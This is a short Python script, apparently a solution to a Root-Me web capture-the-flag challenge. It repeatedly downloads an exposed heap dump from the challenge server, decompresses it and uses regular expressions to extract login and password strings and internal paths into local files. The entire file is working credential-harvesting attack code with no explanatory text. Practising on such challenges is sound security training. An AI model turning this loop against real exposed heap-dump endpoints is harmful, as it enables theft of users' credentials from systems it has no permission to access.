import subprocess
import time
import re


def dump():
    content = open('tmp/lol', 'rb').read()
    tmp = re.findall('login=.*&password=.{150}', content)
    with open('out_log_pass', 'ab+') as f:
        for i in tmp:
            f.write(i+'\n')
    tmp = re.findall('/web-serveur/ch46/[\x33-\x79]*[^\x33-\x79]', content)
    with open('out_href', 'ab+') as f:
        for i in tmp:
            f.write(i+'\n')


while True:
    s = subprocess.Popen(['wget', '-O', 'tmp/lol.gz', 'challenge01.root-me.org/web-serveur/ch46/heapdump'])
    s.communicate()
    print(s.returncode)

    s = subprocess.Popen(['gzip', '-d', 'tmp/lol.gz'])
    s.communicate()
    print(s.returncode)

    dump()

    s = subprocess.Popen(['rm', 'tmp/lol'])
    s.communicate()
    print(s.returncode)

    time.sleep(30)
